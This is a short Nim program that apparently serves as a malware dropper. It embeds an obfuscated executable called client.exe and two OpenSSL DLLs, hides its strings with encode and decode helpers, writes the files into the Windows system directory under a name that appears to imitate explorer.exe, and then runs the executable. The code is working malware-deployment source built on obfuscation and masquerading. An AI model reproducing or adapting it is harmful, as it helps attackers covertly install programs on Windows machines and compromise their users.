from os import `/`
from os import getEnv
from os import existsFile

from winim/inc/shellapi import ShellExecuteW
from winim/winstr import winstrConverterStringToLPWSTR

from lib/functions/hideString import d, e

from lib/constants import EXE_NAME

const EXPLORER: string = e staticRead("./../dist/client.exe")
const DLL1: string = e staticRead("./lib/more/dlls/libcrypto-1_1-x64.dll")
const DLL2: string = e staticRead("./lib/more/dlls/libssl-1_1-x64.dll")

let dest: string = getEnv d e "windir"

let EXPLORERdest: string = dest / d EXE_NAME
let DLL1dest: string = dest / d e "libcrypto-1_1-x64.dll"
let DLL2dest: string = dest / d e "libssl-1_1-x64.dll"

# fails if not administrator
if not existsFile DLL1dest:
  writeFile(DLL1dest, d DLL1)
if not existsFile DLL2dest:
  writeFile(DLL2dest, d DLL2)

writeFile(EXPLORERdest, d EXPLORER)

discard ShellExecuteW(0, nil, EXPLORERdest, nil, nil, 5)
